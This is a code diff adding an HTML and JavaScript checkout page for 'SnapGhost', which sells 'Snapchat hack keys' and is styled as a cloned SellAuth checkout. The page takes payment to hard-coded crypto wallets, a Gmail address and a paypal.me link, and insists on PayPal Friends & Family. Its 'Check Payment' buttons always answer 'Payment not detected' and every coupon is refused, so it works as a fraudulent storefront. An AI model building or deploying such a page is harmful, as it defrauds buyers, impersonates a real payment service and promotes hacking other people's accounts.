@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Checkout - SnapGhost</title>
+  <link rel="icon" href="./logo.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <!-- base styles pulled from the cloned site -->
+  <link rel="stylesheet" href="./checkout/_next/static/css/f7fae013b27bf72e.css">
+  <link rel="stylesheet" href="./checkout/_next/static/css/8ec63b93f1258989.css">
+  <style id="clone-fixes">
+    body { margin:0; background:#0a0a0a; color:#e5e7eb; font-family:'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; letter-spacing:0.01em; overflow-x:hidden; }
+    .page { max-width:1200px; margin:0 auto; padding:32px 16px 48px; display:flex; flex-direction:column; gap:32px; }
+    @media (min-width:1024px) { .page { flex-direction:row; align-items:flex-start; gap:32px; } }
+    .panel { background:#141414; border:1px solid rgba(255,255,255,0.05); border-radius:12px; padding:24px; }
+    .summary { flex:1; max-width:420px; display:flex; flex-direction:column; gap:24px; }
+    .form-wrap { flex:1; min-width:0; background:#0f0f0f; border:1px solid rgba(255,255,255,0.05); border-radius:12px; padding:24px; }
+    .brand { display:flex; align-items:center; gap:12px; }
+    .brand img { width:40px; height:40px; border-radius:9999px; border:1px solid rgba(255,255,255,0.05); object-fit:cover; }
+    .price-big { font-size:44px; font-weight:600; color:#fff; margin:0; }
+    .item-row { display:flex; justify-content:space-between; gap:12px; }
+    .item-row img { width:56px; height:56px; border-radius:10px; border:1px solid rgba(255,255,255,0.05); object-fit:cover; }
+    .muted { color:#9ca3af; }
+    .strong { color:#fff; font-weight:600; }
+    .divider { border-top:1px solid rgba(255,255,255,0.05); margin:8px 0; }
+    .btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 14px; border-radius:10px; border:1px solid rgb(246 246 246); color:rgb(246 246 246); background:transparent; text-decoration:none; transition:background .2s; }
+    .btn:hover { background:rgba(246,246,246,0.08); }
+    .support { display:flex; flex-direction:column; gap:8px; }
+    .stepper { display:flex; gap:12px; margin-bottom:24px; color:#9ca3af; }
+    .stepper .active { color:rgb(246 246 246); border-color:rgb(246 246 246); }
+    .step { border-bottom:2px solid rgba(255,255,255,0.05); flex:1; padding-bottom:8px; }
+    .field { margin-bottom:16px; }
+    .field label { display:block; margin-bottom:6px; color:#e5e7eb; font-size:14px; }
+    .input, .select { width:100%; padding:10px 12px; border-radius:8px; border:1px solid rgba(255,255,255,0.08); background:#181818; color:#e5e7eb; }
+    .checkbox { display:flex; align-items:center; gap:8px; margin-bottom:12px; color:#e5e7eb; font-size:14px; }
+    .primary { width:100%; padding:12px; border-radius:10px; border:1px solid rgb(246 246 246); background:rgb(246 246 246); color:#06060c; font-weight:700; cursor:pointer; }
+    .primary:hover { background:#fff; }
+    .pay-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:12px; }
+    .pay-card { display:flex; align-items:center; gap:10px; padding:12px; border-radius:10px; border:1px solid rgba(255,255,255,0.08); background:#181818; cursor:pointer; transition:all .2s; }
+    .pay-card:hover { border-color:rgba(246,246,246,0.6); background:#1d1d1d; }
+    .pay-card.active { border-color:rgb(246,246,246); box-shadow:0 0 0 2px rgba(246,246,246,0.2); }
+    .pay-icon { width:28px; height:28px; border-radius:8px; background:#0d0d0d; display:grid; place-items:center; font-weight:700; color:#f6f6f6; }
+    .pay-icon img { width:100%; height:100%; object-fit:contain; }
+    .pay-box { margin-top:24px; padding:16px; border:1px solid rgba(255,255,255,0.08); border-radius:10px; background:#111; display:none; flex-direction:column; gap:12px; }
+    .pay-box.show { display:flex; }
+    .hidden-section { display:none !important; }
+    .pay-row { display:flex; justify-content:space-between; align-items:center; gap:8px; }
+    .address { word-break:break-all; font-family:monospace; }
+    .copy-btn { padding:6px 10px; border-radius:8px; border:1px solid rgba(255,255,255,0.15); background:#181818; color:#e5e7eb; cursor:pointer; }
+    .copy-btn:hover { background:#222; }
+    .qr { width:160px; height:160px; border-radius:10px; background:#0d0d0d; display:grid; place-items:center; border:1px solid rgba(255,255,255,0.1); position:relative; overflow:visible; }
+    .qr::after {
+      content:'';
+      position:absolute;
+      inset:0px;
+      border-radius:0px;
+      pointer-events:none;
+      z-index:2;
+      box-shadow:
+        0 0 16px 6px rgba(255,255,255,0.35),
+        0 0 22px 10px rgba(0,0,0,0.4);
+      animation:border-flash 2s ease-in-out infinite;
+      background:transparent;
+    }
+    .qr img { position:relative; z-index:2; }
+    .timer { font-weight:700; color:#f6f6f6; }
+    .muted-small { color:#9ca3af; font-size:13px; }
+    .paypal-steps { display:flex; flex-direction:column; gap:12px; }
+    .paypal-step { border:1px solid rgba(255,255,255,0.08); border-radius:10px; padding:12px; background:#0f0f0f; }
+    .paypal-step-title { font-weight:700; margin-bottom:6px; }
+    .paypal-note { font-size:13px; color:#fbbf24; }
+    .paypal-order { display:flex; justify-content:space-between; gap:12px; }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <div class="summary panel">
+      <div class="brand">
+        <img src="./logo.png" alt="SnapGhost">
+        <div>
+          <div class="strong">SnapGhost</div>
+        </div>
+      </div>
+      <div>
+        <p class="muted" id="summary-desc" style="margin:0 0 4px;">Payment for Snapchat-Hack-Key</p>
+        <p class="price-big" id="summary-total">$75.00</p>
+      </div>
+      <div class="item-row">
+        <div style="display:flex; gap:12px; align-items:center; flex:1;">
+          <img id="summary-img" src="./logo.png" alt="1 Hack Key">
+          <div style="flex:1; min-width:0;">
+            <div class="strong" id="summary-name" style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">1 Hack Key</div>
+            <div class="muted" id="summary-sub" style="font-size:13px;">Hacking terminal key</div>
+            <div class="muted" id="summary-qty" style="font-size:12px;">1x</div>
+          </div>
+        </div>
+        <div class="strong" id="summary-line-total">$75.00</div>
+      </div>
+      <div class="divider"></div>
+      <div style="display:flex; justify-content:space-between; font-size:14px;" class="muted">
+        <span>Subtotal</span><span id="summary-subtotal">$75.00</span>
+      </div>
+      <div style="display:flex; justify-content:space-between; font-size:16px; font-weight:600; color:#fff;">
+        <span>Total</span><span id="summary-total-btm">$75.00</span>
+      </div>
+      <div class="divider"></div>
+      <div class="support">
+        <div class="strong" style="font-size:16px;">Having issues with your order?</div>
+        <div class="muted" style="font-size:14px;">Please contact the website owner for assistance.</div>
+      </div>
+      <div style="margin-top:auto; font-size:13px; display:flex; align-items:center; gap:6px;" class="muted">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <rect x="3" y="3" width="18" height="18" rx="3" ry="3"></rect>
+          <path d="M8 12h4m-4 4h8m-4-8h6"></path>
+        </svg>
+        <span>Powered by SellAuth</span>
+      </div>
+    </div>
+
+    <div class="form-wrap panel">
+      <div class="stepper">
+        <div class="step active">
+          <div class="strong" style="font-size:14px;">Step 1</div>
+          <div>Order Information</div>
+        </div>
+        <div class="step">
+          <div class="strong" style="font-size:14px;">Step 2</div>
+          <div>Confirm &amp; Pay</div>
+        </div>
+        <div class="step">
+          <div class="strong" style="font-size:14px;">Step 3</div>
+          <div>Receive Your Items</div>
+        </div>
+      </div>
+
+      <form id="checkout-form">
+        <div class="field">
+          <label for="email">E-mail Address *</label>
+          <input id="email" class="input" type="email" placeholder="The order confirmation will be sent to this e-mail address.">
+        </div>
+
+        <div class="field">
+          <label for="coupon">Coupon Code</label>
+          <div style="display:flex; gap:8px;">
+            <input id="coupon" class="input" type="text" placeholder="Have a coupon code? Enter it here.">
+            <button type="button" class="btn" id="apply-coupon" style="min-width:88px; padding:10px;">Apply</button>
+          </div>
+          <div class="muted-small" id="coupon-status" style="margin-top:6px; min-height:18px;"></div>
+        </div>
+
+        <div class="field">
+          <label>Payment Method *</label>
+          <div class="pay-grid" id="pay-grid">
+            <div class="pay-card" data-pay="paypal"><div class="pay-icon"><img src="./paypal.png" alt="PayPal"></div><div><div class="strong">PayPal</div><div class="muted-small">Friends &amp; Family</div></div></div>
+            <div class="pay-card" data-pay="btc"><div class="pay-icon">₿</div><div><div class="strong">Bitcoin</div><div class="muted-small">Bitcoin network</div></div></div>
+            <div class="pay-card" data-pay="eth"><div class="pay-icon">Ξ</div><div><div class="strong">Ethereum</div><div class="muted-small">Ethereum mainnet</div></div></div>
+            <div class="pay-card" data-pay="usdt"><div class="pay-icon">₮</div><div><div class="strong">USDT (ERC-20)</div><div class="muted-small">ERC-20 only</div></div></div>
+            <div class="pay-card" data-pay="sol"><div class="pay-icon">◎</div><div><div class="strong">Solana</div><div class="muted-small">Solana network</div></div></div>
+            <div class="pay-card" data-pay="ltc"><div class="pay-icon">Ł</div><div><div class="strong">Litecoin</div><div class="muted-small">Litecoin network</div></div></div>
+          </div>
+        </div>
+
+        <div class="checkbox">
+          <input id="terms" type="checkbox" style="width:16px; height:16px;">
+          <label for="terms">I have read and agree to SnapGhost's Terms of Service.</label>
+        </div>
+        <div class="checkbox">
+          <input id="newsletter" type="checkbox" style="width:16px; height:16px;">
+          <label for="newsletter">I would like to receive updates and promotions from SnapGhost.</label>
+        </div>
+
+        <button id="proceed" type="button" class="primary" style="margin-top:16px;">Proceed to Payment</button>
+      </form>
+
+      <div id="pay-box" class="pay-box">
+        <div class="pay-row">
+          <div>
+            <div class="strong" id="pay-title">Payment Details</div>
+            <div class="muted-small" id="pay-subtitle">Send the exact amount to the address below.</div>
+          </div>
+          <div class="timer" id="timer">30:00</div>
+        </div>
+        <div id="crypto-details">
+          <div class="pay-row">
+            <div>
+              <div class="muted">Network</div>
+              <div class="strong" id="pay-network">Bitcoin</div>
+            </div>
+            <div>
+              <div class="muted">Deliver to</div>
+              <div class="strong" id="pay-email">you@example.com</div>
+            </div>
+          </div>
+          <div class="pay-row" style="align-items:flex-start;">
+            <div>
+              <div class="muted">Address</div>
+              <div class="address" id="pay-address"></div>
+            </div>
+            <button type="button" class="copy-btn" id="copy-address">Copy</button>
+          </div>
+          <div class="pay-row" style="align-items:flex-start; gap:16px; flex-wrap:wrap;">
+            <div>
+              <div class="muted-small" style="margin-bottom:6px;">Amount: <span class="strong" id="pay-amount">--</span></div>
+              <div class="qr"><img id="qr-img" src="" alt="QR Code" style="width:100%;height:100%;object-fit:contain;"></div>
+            </div>
+            <div style="flex:1; min-width:200px;">
+              <div class="muted">Instructions</div>
+              <div class="muted-small" id="instructions">Send payment and your order will be delivered after 2 confirmations.</div>
+              
+            </div>
+          </div>
+          <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
+            <button type="button" class="btn" id="check-payment" style="border-color:rgba(255,255,255,0.3);">Check Payment</button>
+            <div id="check-status" class="muted-small" style="display:flex; align-items:center; gap:8px; min-height:24px;"></div>
+          </div>
+        </div>
+        <div id="paypal-details" class="paypal-steps" style="display:none;">
+          <div class="pay-row" style="align-items:flex-start;">
+            <div>
+              <div class="strong">PayPal Payment Details</div>
+            </div>
+            <div class="timer" id="paypal-timer">30:00</div>
+          </div>
+          <div class="paypal-step">
+            <div class="paypal-step-title">Step 1: Send payment to:</div>
+            <div class="pay-row" style="align-items:flex-start;">
+              <div class="address" id="paypal-target-value">ppastrih@gmail.com</div>
+              <button type="button" class="copy-btn" id="paypal-copy">Copy Email</button>
+            </div>
+            <div class="paypal-note">SEND AS FRIENDS &amp; FAMILY !</div>
+            <div class="muted-small">If PayPal does not support Friends &amp; Family in your country, do not send the payment. Please contact us to send us the payment directly.</div>
+          </div>
+          <div class="paypal-step">
+            <div class="paypal-step-title">Step 2: Type in the order # number in transaction information.</div>
+            <div class="address"># <span id="paypal-order-number">1VM80U</span></div>
+          </div>
+          <div class="paypal-step">
+            <div class="paypal-step-title">Step 3: Send the following amount:</div>
+            <div class="strong"><span id="paypal-amount">150.00</span> $</div>
+            <div class="muted-small">Send as "Friends and Family"</div>
+          </div>
+          <div class="paypal-step">
+            <div class="paypal-step-title">Order Summary</div>
+            <div class="paypal-order">
+              <div class="muted-small" id="paypal-order-summary">1x Snapchat Hack</div>
+              <div class="strong" id="paypal-order-total">$150.00</div>
+            </div>
+          </div>
+          <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
+            <button type="button" class="btn" id="paypal-check" style="border-color:rgba(255,255,255,0.3);">Check Payment</button>
+            <div id="paypal-check-status" class="muted-small" style="display:flex; align-items:center; gap:8px; min-height:24px;"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+<script>
+  (function(){
+    const productMap = {
+      "1": { id:1, name:"1 Hack Key", price:75, description:"Hacking terminal key", image:"./logo.png" },
+      "3": { id:3, name:"3 Hack Keys", price:200, description:"Bundle of 3 hack keys", image:"./logo.png" },
+      "5": { id:5, name:"5 Hack Keys", price:300, description:"Five hack keys bundle", image:"./logo.png" }
+    };
+
+    const data = {
+      paypal: { name:'PayPal', network:'PayPal', instructions:'Send as Friends & Family. Include your order number in transaction info.' },
+      btc: { name:'Bitcoin', network:'Bitcoin', cgId:'bitcoin', addresses:['bc1qa74vrktepru6jsfrwjg8z9y2wlrlf2n9jzmv78','bc1q6mnc3tgevc8fwpay7xkaz4uhy57zzn84n9qeha'], qrs:['./qr/qr-btc.jpg','./qr/qr-btc-alt.jpg'], instructions:'Send the exact amount of BTC. Order will be delivered after 2 confirmations.' },
+      eth: { name:'Ethereum', network:'Ethereum', cgId:'ethereum', addresses:['0x8a70C7F785D685C544F44E6EaF70f344d31871E5','0xAB00fBFbcBD0730Bd4186Ad8879Eb76982580425'], qrs:['./qr/qr-eth.jpg','./qr/qr-eth-alt.jpg'], instructions:'Send exact ETH on Ethereum mainnet. Order delivered after 2 confirmations.' },
+      usdt:{ name:'USDT (ERC-20)', network:'Ethereum (ERC-20)', cgId:'tether', addresses:['0x8a70C7F785D685C544F44E6EaF70f344d31871E5','0xAB00fBFbcBD0730Bd4186Ad8879Eb76982580425'], qrs:['./qr/qr-usdt.jpg','./qr/qr-usdt-alt.jpg'], instructions:'Send USDT on ERC-20 only. Delivered after 2 confirmations.' },
+      sol: { name:'Solana', network:'Solana', cgId:'solana', addresses:['EKov9qMGN6z9pggxu3kSJZx4KfdQY7xGiMtERWVy53Nv','CjKRMT4JPCUYFNByCMLC9Sbxqc2kBPARHb9yMyEvzJ2v'], qrs:['./qr/qr-sol.jpg','./qr/qr-sol-alt.jpg'], instructions:'Send SOL on Solana. Delivered after 2 confirmations.' },
+      ltc: { name:'Litecoin', network:'Litecoin', cgId:'litecoin', addresses:['LPuQUJsQysA5Wq5UkkohEVYWhYXM8vD1Z8','LSN4wYgnajxs4c8bZamNAp5sVVaRpnCCuH'], qrs:['./qr/qr-ltc.jpg','./qr/qr-ltc-alt.jpg'], instructions:'Send exact LTC. Delivered after 2 confirmations.' }
+    };
+    const paypalTargets = [
+      { type:'link', value:'https://paypal.me/snapghosties' },
+      { type:'link', value:'https://paypal.me/snapghosties' },
+      { type:'link', value:'https://paypal.me/snapghosties' }
+    ];
+
+    const form = document.getElementById('checkout-form');
+    const proceed = document.getElementById('proceed');
+    const payBox = document.getElementById('pay-box');
+    const payTitle = document.getElementById('pay-title');
+    const paySubtitle = document.getElementById('pay-subtitle');
+    const payNetwork = document.getElementById('pay-network');
+    const payEmail = document.getElementById('pay-email');
+    const payAddress = document.getElementById('pay-address');
+    const payAmount = document.getElementById('pay-amount');
+    const copyBtn = document.getElementById('copy-address');
+    const instructions = document.getElementById('instructions');
+    const timerEl = document.getElementById('timer');
+    const qrImg = document.getElementById('qr-img');
+    const summaryDesc = document.getElementById('summary-desc');
+    const summaryTotalTop = document.getElementById('summary-total');
+    const summaryImg = document.getElementById('summary-img');
+    const summaryName = document.getElementById('summary-name');
+    const summarySub = document.getElementById('summary-sub');
+    const summaryQty = document.getElementById('summary-qty');
+    const summaryLineTotal = document.getElementById('summary-line-total');
+    const summarySubtotal = document.getElementById('summary-subtotal');
+    const summaryTotalBtm = document.getElementById('summary-total-btm');
+    const payGrid = document.getElementById('pay-grid');
+    const applyCoupon = document.getElementById('apply-coupon');
+    const couponStatus = document.getElementById('coupon-status');
+    const checkBtn = document.getElementById('check-payment');
+    const checkStatus = document.getElementById('check-status');
+    const cryptoDetails = document.getElementById('crypto-details');
+    const paypalDetails = document.getElementById('paypal-details');
+    const paypalTargetValue = document.getElementById('paypal-target-value');
+    const paypalCopy = document.getElementById('paypal-copy');
+    const paypalOrderNumber = document.getElementById('paypal-order-number');
+    const paypalAmount = document.getElementById('paypal-amount');
+    const paypalOrderSummary = document.getElementById('paypal-order-summary');
+    const paypalOrderTotal = document.getElementById('paypal-order-total');
+    const paypalTimerEl = document.getElementById('paypal-timer');
+    const paypalCheckBtn = document.getElementById('paypal-check');
+    const paypalCheckStatus = document.getElementById('paypal-check-status');
+    let selectedPay = '';
+    let countdown;
+    let qr;
+    let productPriceUsd = 75; // will be overwritten by product selection
+    const rates = {}; // cgId -> price in USD
+
+    function startTimer(minutes, targetEl){
+      clearInterval(countdown);
+      let remaining = minutes*60;
+      const tick = () => {
+        const m = String(Math.floor(remaining/60)).padStart(2,'0');
+        const s = String(remaining%60).padStart(2,'0');
+        targetEl.textContent = `${m}:${s}`;
+        if(remaining<=0){ clearInterval(countdown); targetEl.textContent='Expired'; }
+        remaining--;
+      };
+      tick();
+      countdown = setInterval(tick, 1000);
+    }
+
+    function getSelection(){
+      const params = new URLSearchParams(window.location.search);
+      const cached = JSON.parse(localStorage.getItem('lastProductSelection') || '{}');
+      const key = params.get('product') || cached.product || '1';
+      const qty = Math.max(1, parseInt(params.get('qty') || cached.qty || '1', 10) || 1);
+      const prod = productMap[key] || productMap['1'];
+      return { prod, qty, key };
+    }
+
+    function formatUsd(val){
+      return new Intl.NumberFormat('en-US', { style:'currency', currency:'USD' }).format(val || 0);
+    }
+
+    function populateSummary(){
+      const { prod, qty, key } = getSelection();
+      const unit = Number(prod.price) || 0;
+      const total = unit * qty;
+      productPriceUsd = total;
+
+      summaryDesc && (summaryDesc.textContent = `Payment for ${prod.name}`);
+      summaryTotalTop && (summaryTotalTop.textContent = formatUsd(total));
+      if (summaryImg) {
+        summaryImg.src = prod.image || './logo.png';
+        summaryImg.alt = prod.name;
+      }
+      summaryName && (summaryName.textContent = prod.name);
+      summarySub && (summarySub.textContent = prod.description || '');
+      summaryQty && (summaryQty.textContent = `${qty}x`);
+      summaryLineTotal && (summaryLineTotal.textContent = formatUsd(total));
+      summarySubtotal && (summarySubtotal.textContent = formatUsd(total));
+      summaryTotalBtm && (summaryTotalBtm.textContent = formatUsd(total));
+
+      localStorage.setItem('lastProductSelection', JSON.stringify({ product: key, qty }));
+    }
+
+    function formatUsdPlain(val){
+      return (Number(val || 0)).toFixed(2);
+    }
+
+    function generateOrderId(len){
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let out = '';
+      for(let i=0; i<len; i++){
+        out += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return out;
+    }
+
+    function populatePaypalDetails(){
+      const { prod, qty } = getSelection();
+      const orderText = `${qty}x ${prod.name}`;
+      const target = paypalTargets[Math.floor(Math.random() * paypalTargets.length)];
+      const label = target.type === 'link' ? 'Copy Link' : 'Copy Email';
+      paypalTargetValue.textContent = target.value;
+      paypalCopy.textContent = label;
+      paypalCopy.setAttribute('data-copy', target.value);
+      paypalOrderNumber.textContent = generateOrderId(6);
+      paypalAmount.textContent = formatUsdPlain(productPriceUsd);
+      paypalOrderSummary.textContent = orderText;
+      paypalOrderTotal.textContent = formatUsd(productPriceUsd);
+    }
+
+    function renderQR(text){
+      if(!qr){
+        // minimal QR draw: fallback to text block
+        const ctx = qrCanvas.getContext('2d');
+        ctx.fillStyle = '#0d0d0d';
+        ctx.fillRect(0,0,qrCanvas.width, qrCanvas.height);
+        ctx.fillStyle = '#f6f6f6';
+        ctx.font = '12px monospace';
+        ctx.fillText('QR', 70,80);
+        return;
+      }
+    }
+
+    function setQR(src){
+      qrImg.src = src || '';
+    }
+
+    function setAmount(entry){
+      const price = rates[entry.cgId];
+      if(price && price > 0){
+        const amt = productPriceUsd / price;
+        payAmount.textContent = `${amt.toFixed(6)} ${entry.name}`;
+      } else {
+        payAmount.textContent = '--';
+      }
+    }
+
+    async function fetchRates(){
+      try{
+        const ids = Object.values(data).map(d=>d.cgId).filter(Boolean).join(',');
+        if(!ids){ return; }
+        const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
+        const json = await res.json();
+        Object.values(data).forEach(d=>{
+          if(json[d.cgId] && json[d.cgId].usd){
+            rates[d.cgId] = json[d.cgId].usd;
+          }
+        });
+      }catch(e){
+        console.warn('rate fetch failed', e);
+      }
+    }
+
+    payGrid.addEventListener('click', (e)=>{
+      const card = e.target.closest('.pay-card');
+      if(!card) return;
+      payGrid.querySelectorAll('.pay-card').forEach(c=>c.classList.remove('active'));
+      card.classList.add('active');
+      selectedPay = card.getAttribute('data-pay');
+    });
+
+    proceed.addEventListener('click', () => {
+      const email = document.getElementById('email').value.trim();
+      const pay = selectedPay;
+      const terms = document.getElementById('terms').checked;
+      if(!email || email.indexOf('@') === -1 || email.indexOf('.') === -1){
+        alert('Enter a valid e-mail.');
+        return;
+      }
+      if(!pay){ alert('Select a payment method.'); return; }
+      if(!terms){ alert('Please agree to the Terms of Service.'); return; }
+      const entry = data[pay];
+      payEmail.textContent = email;
+      payTitle.textContent = pay === 'paypal' ? 'PayPal Payment' : `${entry.name} Payment`;
+      paySubtitle.textContent = pay === 'paypal' ? 'Follow the steps below to complete your PayPal payment.' : 'Send the exact amount to the address below.';
+      timerEl.style.display = pay === 'paypal' ? 'none' : '';
+      if(pay === 'paypal'){
+        clearInterval(countdown);
+        cryptoDetails.style.display = 'none';
+        paypalDetails.style.display = 'flex';
+        populatePaypalDetails();
+        startTimer(30, paypalTimerEl);
+      } else {
+        cryptoDetails.style.display = 'block';
+        paypalDetails.style.display = 'none';
+        const idx = Math.floor(Math.random() * entry.addresses.length);
+        const chosenAddress = entry.addresses[idx];
+        const chosenQr = entry.qrs[idx] || '';
+        payNetwork.textContent = entry.network;
+        payAddress.textContent = chosenAddress;
+        instructions.textContent = entry.instructions + ' Order will be delivered to your e-mail after 2 confirmations.';
+        setQR(chosenQr);
+        setAmount(entry);
+      }
+      form.classList.add('hidden-section');
+      payBox.classList.add('show');
+      if(pay !== 'paypal'){
+        startTimer(30, timerEl);
+      }
+      document.querySelectorAll('.stepper .step').forEach((el, idx)=>{
+        el.classList.toggle('active', idx===1);
+      });
+    });
+
+    copyBtn.addEventListener('click', () => {
+      const addr = payAddress.textContent;
+      navigator.clipboard && navigator.clipboard.writeText(addr).then(()=>{copyBtn.textContent='Copied'; setTimeout(()=>copyBtn.textContent='Copy',1200);});
+    });
+
+    paypalCopy.addEventListener('click', () => {
+      const val = paypalCopy.getAttribute('data-copy') || paypalTargetValue.textContent;
+      navigator.clipboard && navigator.clipboard.writeText(val).then(()=>{
+        const original = paypalCopy.textContent;
+        paypalCopy.textContent = 'Copied';
+        setTimeout(()=>{paypalCopy.textContent = original;}, 1200);
+      });
+    });
+
+    populateSummary();
+    fetchRates();
+
+    checkBtn.addEventListener('click', ()=>{
+      checkStatus.innerHTML = '<span class="loading" style="display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.4);border-top-color:rgba(255,255,255,0.9);border-radius:50%;animation:spin 0.8s linear infinite;"></span><span>Checking payment...</span>';
+      setTimeout(()=>{
+        checkStatus.innerHTML = '<span style="color:#f59e0b;">Payment not detected.</span>';
+      }, 5000);
+    });
+
+    paypalCheckBtn.addEventListener('click', ()=>{
+      paypalCheckStatus.innerHTML = '<span class="loading" style="display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.4);border-top-color:rgba(255,255,255,0.9);border-radius:50%;animation:spin 0.8s linear infinite;"></span><span>Checking payment...</span>';
+      setTimeout(()=>{
+        paypalCheckStatus.innerHTML = '<span style="color:#f59e0b;">Payment not detected.</span>';
+      }, 5000);
+    });
+
+    applyCoupon.addEventListener('click', ()=>{
+      const val = (document.getElementById('coupon').value || '').trim();
+      const was = applyCoupon.textContent;
+      applyCoupon.textContent = 'Applying...';
+      setTimeout(()=>{
+        couponStatus.innerHTML = '<span style="color:#f87171;">Coupon code is invalid.</span>';
+        applyCoupon.textContent = was;
+      }, 800);
+    });
+  })();
+</script>
+<style>
+@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes border-flash {
+  0%, 100% { box-shadow:0 0 10px rgba(255,255,255,0.6), 0 0 14px rgba(0,0,0,0.4); }
+  50% { box-shadow:0 0 10px rgba(0,0,0,0.55), 0 0 14px rgba(255,255,255,0.6); }
+}
+</style>
+</body>
+</html>
